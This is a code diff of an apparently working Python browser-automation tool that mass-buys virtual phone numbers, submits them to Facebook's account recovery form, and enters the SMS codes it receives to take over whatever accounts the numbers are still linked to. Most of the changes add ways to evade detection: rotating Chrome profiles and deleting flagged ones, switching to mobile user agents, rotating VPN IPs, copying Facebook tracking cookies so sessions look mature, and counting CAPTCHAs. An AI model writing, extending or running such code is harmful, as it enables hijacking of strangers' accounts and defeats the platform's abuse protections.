+                                fb_profile_name = generate_next_profile_name(force_new=True)
                                 import socket
                                 def get_free_port():
-                                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                                        s.bind(('127.0.0.1', 0))
-                                        return s.getsockname()[1]
+                                    p_check = 9223
+                                    while True:
+                                        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                                            try:
+                                                s.bind(('127.0.0.1', p_check))
+                                                return p_check
+                                            except OSError:
+                                                p_check += 1
                                 fb_port = get_free_port()
                                 
-                                print(f"\n🔄 Spawning separate Chrome profile '{fb_profile_name}' on port {fb_port} for Facebook recovery...")
-                                fb_browser, fb_context, fb_is_standalone = launch_and_connect_chrome(p, fb_port, fb_profile_name, user_data_subdir="chrome_profiles_fb")
+                                print(f"\n🔄 Spawning separate fresh Chrome profile '{fb_profile_name}' on port {fb_port} for Facebook recovery...")
+                                fb_browser, fb_context, fb_is_standalone = launch_and_connect_chrome(p, fb_port, fb_profile_name, user_data_subdir="chrome_profiles_fb", is_guest=False, is_mobile=False)
+                                # Inject mature Facebook tracking cookies from main context
+                                try:
+                                    main_cookies = context.cookies()
+                                    fb_tracking_cookies = [
+                                        c for c in main_cookies 
+                                        if "facebook.com" in c.get("domain", "") and c.get("name") in ["datr", "sb", "wd"]
+                                    ]
+                                    if fb_tracking_cookies:
+                                        fb_context.add_cookies(fb_tracking_cookies)
+                                        print(f"✨ Injected {len(fb_tracking_cookies)} mature Facebook tracking cookies from Hero SMS context.")
+                                except Exception as c_err:
+                                    print(f"⚠️ Tracking cookie injection failed: {c_err}")
                             else:
                                 print(f"\n🔄 Reusing running Chrome profile '{fb_profile_name}' for this attempt...")
 
@@ -1890,12 +2741,16 @@ def main() -> None:
                         continue
                     
                     # Dynamically determine valid buy button candidate texts to search
-                    buy_candidates = ["Buy for $0.09", "Buy for $0.099"]
+                    buy_candidates = []
                     configured_text = CONFIG.buy_text
-                    if configured_text and configured_text not in buy_candidates:
-                        buy_candidates.insert(0, configured_text)
-                        
-                    print(f"\n🛒 Locating buy button candidates: {buy_candidates}...")
+                    if configured_text:
+                        buy_candidates.append(configured_text)
+                    buy_candidates.extend(["Buy for $0.099", "Buy for $0.09", "Buy for", "Buy"])
+                    
+                    min_price_config = getattr(CONFIG, 'min_price', 0.01)
+                    max_price_config = getattr(CONFIG, 'max_price', 0.15)
+                    
+                    print(f"\n🛒 Locating buy button candidates within range ${min_price_config:.3f} - ${max_price_config:.3f}: {buy_candidates}...")
                     # Give the page a tiny bit of time to settle before clicking buy, 
                     # especially if we just selected the country
                     time.sleep(1) 
@@ -1903,28 +2758,105 @@ def main() -> None:
                     purchase_success = False
                     for buy_attempt in range(1, 11):
                         buy_clicked = False
+                        price_out_of_bounds = False
                         click_err = None
                         close_cookies_if_needed(hero)
+                        if check_and_recover_server_error(hero):
+                            print("🔄 Re-selecting service and country after server error recovery...")
+                            select_service_and_country(hero)
                         
+                        # 1. Search text candidates
                         for candidate in buy_candidates:
                             try:
-                                btn = hero.locator(f"button:has-text('{candidate}'), a:has-text('{candidate}'), div[role='button']:has-text('{candidate}')").first
-                                if btn.is_visible(timeout=2000):
-                                    print(f"🎯 Found visible buy button: '{candidate}'. Clicking it (attempt {buy_attempt}/10)...")
-                                    btn.click()
-                                    hero.wait_for_load_state("networkidle", timeout=5000)
+                                btn = hero.locator(f"button:has-text('{candidate}'), a:has-text('{candidate}'), div[role='button']:has-text('{candidate}'), .v-btn:has-text('{candidate}')").first
+                                if btn.is_visible(timeout=1500):
+                                    # Verify price range
+                                    price_ok, parsed_price = check_price_range(btn, min_price_config, max_price_config)
+                                    if not price_ok:
+                                        print(f"🛑 Skipping purchase because price {parsed_price:.3f} USD is outside acceptable range (${min_price_config:.3f} - ${max_price_config:.3f} USD).")
+                                        price_out_of_bounds = True
+                                        break
+                                        
+                                    if parsed_price > 0:
+                                        price_per_sms = parsed_price
+                                        
+                                    print(f"🎯 Found visible buy button: '{candidate}' (Price: {price_per_sms:.3f} USD). Clicking it (attempt {buy_attempt}/10)...")
+                                    try:
+                                        btn.evaluate("el => el.scrollIntoView({block: 'center', inline: 'center'})")
+                                        time.sleep(0.2)
+                                    except Exception:
+                                        pass
+                                    try:
+                                        btn.click(timeout=3000)
+                                    except Exception:
+                                        try:
+                                            btn.click(timeout=3000, force=True)
+                                        except Exception:
+                                            btn.evaluate("el => el.click()")
+                                    try:
+                                        hero.wait_for_load_state("domcontentloaded", timeout=2000)
+                                    except Exception:
+                                        pass
                                     buy_clicked = True
                                     break
                             except Exception as e:
-                                pass
+                                click_err = e
                                 
+                        if price_out_of_bounds:
+                            print("⏳ Price limit block hit. Retrying country/service selection in 10 seconds...")
+                            time.sleep(10)
+                            break
+                                
+                        # 2. Fallback to regex-based Buy button locator if candidate texts didn't hit
                         if not buy_clicked:
                             try:
-                                print(f"⚠️ Direct candidate locator failed. Falling back to generic text click: '{buy_candidates[0]}'...")
-                                click_visible_text(hero, buy_candidates[0], timeout_ms=8000)
-                                buy_clicked = True
-                            except Exception as err:
-                                click_err = err
+                                regex_btn = hero.get_by_role("button", name=re.compile(r"buy", re.I)).first
+                                if not regex_btn.is_visible(timeout=1000):
+                                    regex_btn = hero.locator("button, a, div[role='button'], .v-btn").filter(has_text=re.compile(r"buy", re.I)).first
+                                    
+                                if regex_btn.is_visible(timeout=1500):
+                                    # Verify price range
+                                    price_ok, parsed_price = check_price_range(regex_btn, min_price_config, max_price_config)
+                                    if not price_ok:
+                                        print(f"🛑 Skipping regex purchase because price {parsed_price:.3f} USD is outside acceptable range (${min_price_config:.3f} - ${max_price_config:.3f} USD).")
+                                        price_out_of_bounds = True
+                                        break
+                                        
+                                    if parsed_price > 0:
+                                        price_per_sms = parsed_price
+                                        
+                                    print(f"🎯 Found visible regex buy button (Price: {price_per_sms:.3f} USD). Clicking it (attempt {buy_attempt}/10)...")
+                                    try:
+                                        regex_btn.evaluate("el => el.scrollIntoView({block: 'center', inline: 'center'})")
+                                        time.sleep(0.2)
+                                    except Exception:
+                                        pass
+                                    try:
+                                        regex_btn.click(timeout=3000)
+                                    except Exception:
+                                        try:
+                                            regex_btn.click(timeout=3000, force=True)
+                                        except Exception:
+                                            regex_btn.evaluate("el => el.click()")
+                                    buy_clicked = True
+                            except Exception as e:
+                                click_err = e
+
+                        if price_out_of_bounds:
+                            print("⏳ Price limit block hit. Retrying country/service selection in 10 seconds...")
+                            time.sleep(10)
+                            break
+
+                        # 3. Fallback to generic click_visible_text
+                        if not buy_clicked:
+                            for cand in buy_candidates:
+                                try:
+                                    print(f"⚠️ Direct candidate locator failed. Trying click_visible_text for: '{cand}'...")
+                                    click_visible_text(hero, cand, timeout_ms=4000)
+                                    buy_clicked = True
+                                    break
+                                except Exception as err:
+                                    click_err = err
                                 
                         if not buy_clicked:
                             print(f"❌ Error clicking BUY button: {click_err}")
@@ -1984,6 +2916,29 @@ def main() -> None:
                         except Exception:
                             pass
                             
+                        # Fallback validation: Even if the system toast popup was missed or didn't render,
+                        # we immediately verify by checking if a new number was successfully added to Purchases list.
+                        if not purchase_success and not purchase_failed:
+                            try:
+                                print("🔍 No popup toast detected. Waiting 3 seconds for server purchase processing...")
+                                time.sleep(3.0)
+                                print("🔍 Verifying purchase directly from Purchases history...")
+                                temp_page = hero.context.new_page()
+                                try:
+                                    temp_page.goto(CONFIG.purchased_url or "https://hero-sms.com/purchases/numbers", wait_until="domcontentloaded", timeout=8000)
+                                    # Wait a tiny bit for the table AJAX to render on the new page
+                                    time.sleep(1.5)
+                                    current_top = get_top_number(temp_page)
+                                    if current_top and current_top != top_before:
+                                        print(f"✅ Direct Verification Success! Found new active number in history: {current_top}")
+                                        purchase_success = True
+                                except Exception as direct_check_err:
+                                    pass
+                                finally:
+                                    temp_page.close()
+                            except:
+                                pass
+                                
                         if purchase_success:
                             break
                             
@@ -2011,22 +2966,99 @@ def main() -> None:
                         total_numbers_tried += 1
                         
                         try:
-                            # The browser is verified and running, fill the page with number
-                            print("\n📝 Filling target page with phone number...")
-                            result, fb_page = fill_target_page(fb_context, phone_number)
+                            # Retry the SAME phone number across fresh Chrome profiles if rate limited
+                            max_profile_retries = 3
+                            flagged_profiles = set()
+                            for profile_retry in range(max_profile_retries):
+                                # Ensure a valid Chrome profile is running
+                                if not fb_browser or not fb_browser.is_connected():
+                                    fb_profile_name = generate_next_profile_name(exclude=flagged_profiles, force_new=True)
+                                    import socket
+                                    def get_free_port():
+                                        p_check = 9223
+                                        while True:
+                                            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                                                try:
+                                                    s.bind(('127.0.0.1', p_check))
+                                                    return p_check
+                                                except OSError:
+                                                    p_check += 1
+                                    fb_port = get_free_port()
+                                    use_mobile_agent = (profile_retry > 0)
+                                    print(f"\n🔄 Spawning fresh Chrome profile '{fb_profile_name}' on port {fb_port} for Facebook recovery (Mobile agent: {use_mobile_agent})...")
+                                    fb_browser, fb_context, fb_is_standalone = launch_and_connect_chrome(p, fb_port, fb_profile_name, user_data_subdir="chrome_profiles_fb", is_guest=False, is_mobile=use_mobile_agent)
+                                    # Inject mature Facebook tracking cookies from main context
+                                    try:
+                                        main_cookies = context.cookies()
+                                        fb_tracking_cookies = [
+                                            c for c in main_cookies 
+                                            if "facebook.com" in c.get("domain", "") and c.get("name") in ["datr", "sb", "wd"]
+                                        ]
+                                        if fb_tracking_cookies:
+                                            fb_context.add_cookies(fb_tracking_cookies)
+                                            print(f"✨ Injected {len(fb_tracking_cookies)} mature Facebook tracking cookies from Hero SMS context.")
+                                    except Exception as c_err:
+                                        print(f"⚠️ Tracking cookie injection failed: {c_err}")
+                                
+                                print(f"\n📝 Filling target page with phone number {phone_number} (Attempt {profile_retry + 1}/{max_profile_retries})...")
+                                result, fb_page = fill_target_page(fb_context, phone_number)
+                                
+                                if result == "rate_limited":
+                                    print(f"\n🛑 Facebook Rate-Limit Blocked profile '{fb_profile_name}'!")
+                                    print(f"🧹 Deleting flagged profile directory '{fb_profile_name}' and spawning a NEW profile...")
+                                    flagged_profiles.add(fb_profile_name)
+                                    try: fb_page.close()
+                                    except: pass
+                                    try: fb_browser.close()
+                                    except: pass
+                                    if fb_port:
+                                        close_chrome_on_port(fb_port)
+                                    
+                                    # Delete flagged profile directory from disk (not needed for guest profiles)
+                                    if fb_profile_name != "Guest":
+                                        flagged_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "chrome_profiles_fb", fb_profile_name)
+                                        if os.path.exists(flagged_dir):
+                                            try:
+                                                time.sleep(1)
+                                                shutil.rmtree(flagged_dir, ignore_errors=True)
+                                                print(f"🗑️ Cleaned flagged profile folder '{fb_profile_name}' from disk.")
+                                            except Exception as del_err:
+                                                pass
+                                    
+                                    fb_browser = None
+                                    fb_page = None
+                                    fb_context = None
+                                    fb_port = None
+                                    fb_profile_name = None
+                                    
+                                    print("⏳ Waiting 10 seconds and rotating IP if configured...")
+                                    time.sleep(10)
+                                    rotate_vpn_if_configured()
+                                    continue  # Retry with a new profile on the SAME number!
+                                else:
+                                    break # Exit profile retry loop on success or not_found
                             
                             if result == "success" and fb_page:
                                 print("\n✅ SUCCESS! Account found and recovery in progress!")
                                 print("\n🔄 Checking Hero SMS tab to wait for code...")
-                                hero.bring_to_front()
+                                try:
+                                    if hero.is_closed():
+                                        hero = find_or_open_page(context, CONFIG.hero_url)
+                                    hero.bring_to_front()
+                                except Exception as btf_err:
+                                    print(f"⚠️ Could not bring Hero tab to front: {btf_err}")
                                 
                                 try:
-                                    sms_code = wait_for_sms_code(hero, fb_page=fb_page, timeout_sec=180)
+                                    sms_code = wait_for_sms_code(hero, phone_number=phone_number, fb_page=fb_page, timeout_sec=180, session_stats=session_stats)
                                     total_spent += price_per_sms
                                     update_daily_stats(spent=price_per_sms)
                                     
                                     print("\n🔄 Switching back to Facebook page to enter code...")
-                                    fb_page.bring_to_front()
+                                    try:
+                                        if fb_page and not fb_page.is_closed():
+                                            fb_page.bring_to_front()
+                                    except Exception:
+                                        pass
                                     
                                     submit_success = submit_facebook_code(fb_page, sms_code)
                                     if submit_success:
@@ -2053,7 +3085,8 @@ def main() -> None:
                                             if fb_port:
                                                 close_chrome_on_port(fb_port)
                                             time.sleep(1.5)
-                                            sync_profile_to_official(fb_profile_name)
+                                            if fb_profile_name != "Guest":
+                                                sync_profile_to_official(fb_profile_name)
                                             
                                             # Reset profile context variables so the next run spawns a new profile
                                             fb_browser = None
@@ -2084,34 +3117,32 @@ def main() -> None:
                                         update_daily_stats(failed_logins=1)
                                         delete_failed_number(hero)
                                         time.sleep(2)
+                                except ValueError as ve:
+                                    if str(ve) == "sms_blocked_by_facebook":
+                                        print("\n❌ Facebook is blocking SMS delivery to this number ('We can't send SMS to this mobile number').")
+                                        print("Deleting number and retrying with a new virtual number...")
+                                        delete_failed_number(hero)
+                                        time.sleep(2)
+                                    else:
+                                        raise ve
                                 except RuntimeError as e:
                                     print(f"\n❌ {e}")
                                     delete_failed_number(hero)
                                     time.sleep(2)
                             elif result == "rate_limited":
-                                print("\n🛑 Facebook IP Rate-Limit Detected!")
-                                print("⏳ Pausing automation for 30 seconds to allow Surfshark IP rotation to take effect...")
-                                time.sleep(30)
-                                rotate_vpn_if_configured()
+                                print(f"\n🛑 Number {phone_number} reached max profile retries on rate limits.")
                                 delete_failed_number(hero)
-                                print("\n🔄 Resuming attempt...")
                                 time.sleep(2)
                             elif result == "not_found":
                                 print("\n❌ No account found with this number.")
                                 print("Deleting this number and trying another...")
-                                
-                                # Delete the failed number from the table
                                 delete_failed_number(hero)
-                                
                                 print("\n🔄 Looping to buy another number...")
                                 time.sleep(2)
                             else:
                                 print(f"\n❌ Failed to load target recovery form: {result}")
                                 print("Deleting this number and trying another...")
-                                
-                                # Delete the failed number from the table
                                 delete_failed_number(hero)
-                                
                                 print("\n🔄 Looping to buy another number...")
                                 time.sleep(2)
                         except Exception as setup_err:
@@ -2173,6 +3204,10 @@ def main() -> None:
             if total_numbers_tried > 0:
                 success_rate = (accounts_recovered / total_numbers_tried) * 100
                 print(f"📈 Overall Success Rate    : {success_rate:.1f}%")
+            print(f"🤖 CAPTCHAs Encountered   : {session_stats.get('captcha_triggers', 0)}")
+            if total_numbers_tried > 0:
+                captcha_rate = (session_stats.get('captcha_triggers', 0) / total_numbers_tried) * 100
+                print(f"📊 CAPTCHA Rate per Number : {captcha_rate:.1f}%")
             print(f"💰 Total Amount Spent      : ${total_spent:.3f}")
             print("="*60)
             
@@ -2180,10 +3215,25 @@ def main() -> None:
         try:
             session_end_time = time.time()
             elapsed_seconds = int(session_end_time - session_start_time)
-            # update_daily_stats(duration=elapsed_seconds) (Handled by app.py to prevent double-counting)
-            print(f"\n⏱️ Process stopped gracefully by user. Recorded session duration: {elapsed_seconds}s")
+            elapsed_mins = elapsed_seconds // 60
+            elapsed_secs_remainder = elapsed_seconds % 60
+            print("\n" + "="*60)
+            print("⚠️ AUTOMATION PROCESS STOPPED BY USER")
+            print("="*60)
+            print(f"⏱️  Total Time Elapsed : {elapsed_mins} minutes, {elapsed_secs_remainder} seconds")
+            print(f"🎉 Total Accounts Recovered: {accounts_recovered}")
+            print(f"📱 Total Numbers Tried     : {total_numbers_tried}")
+            if total_numbers_tried > 0:
+                success_rate = (accounts_recovered / total_numbers_tried) * 100
+                print(f"📈 Overall Success Rate    : {success_rate:.1f}%")
+            print(f"🤖 CAPTCHAs Encountered   : {session_stats.get('captcha_triggers', 0)}")
+            if total_numbers_tried > 0:
+                captcha_rate = (session_stats.get('captcha_triggers', 0) / total_numbers_tried) * 100
+                print(f"📊 CAPTCHA Rate per Number : {captcha_rate:.1f}%")
+            print(f"💰 Total Amount Spent      : ${total_spent:.3f}")
+            print("="*60)
         except Exception as se:
-            print(f"⚠️ Error saving session duration on stop: {se}")
+            print(f"⚠️ Error printing session summary on stop: {se}")
     except Exception as e:
         print(f"\n❌ High-level runner error: {e}")
 
